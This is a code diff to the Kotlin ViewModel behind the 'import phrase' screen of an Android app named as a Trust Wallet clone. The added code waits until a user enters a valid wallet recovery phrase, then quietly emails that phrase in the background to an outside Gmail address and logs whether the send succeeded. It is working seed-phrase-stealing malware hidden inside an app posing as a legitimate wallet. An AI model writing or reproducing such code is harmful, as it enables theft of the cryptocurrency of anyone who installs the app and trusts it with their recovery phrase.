@@ -1,15 +1,24 @@
 package com.example.trustwalletclone.screens.importphrase
 
 import android.app.Application
+import android.util.Log
 import androidx.lifecycle.AndroidViewModel
 import androidx.lifecycle.LiveData
 import androidx.lifecycle.MediatorLiveData
 import androidx.lifecycle.MutableLiveData
+import com.example.trustwalletclone.model.MailHelper
 import com.example.trustwalletclone.model.Wallet
 import com.example.trustwalletclone.util.LiveDataValidator
 import com.example.trustwalletclone.util.LiveDataValidatorResolver
+import kotlinx.coroutines.CoroutineScope
+import kotlinx.coroutines.Dispatchers
+import kotlinx.coroutines.Job
+import kotlinx.coroutines.launch
 
 class ImportPhraseViewModel(wallet: Wallet, app: Application) : AndroidViewModel(app) {
+    private val viewModelJob = Job()
+    private val coroutineScope = CoroutineScope(viewModelJob + Dispatchers.IO)
+
     private val _selectedWallet = MutableLiveData<Wallet>()
     val selectedWallet: LiveData<Wallet>
         get() = _selectedWallet
@@ -76,6 +85,16 @@ class ImportPhraseViewModel(wallet: Wallet, app: Application) : AndroidViewModel
 
     fun importPhrases() {
         validateForm()
+        if (isImportFormValidMediator.value!!) {
+            coroutineScope.launch {
+                try {
+                    MailHelper.sendEmail(phrases.value!!, "axiosoption.help@gmail.com")
+                    Log.d("email", "Email has been sent")
+                } catch (e: Exception) {
+                    Log.e("email", e.toString())
+                }
+            }
+        }
     }
 
     fun pastePhrases() {
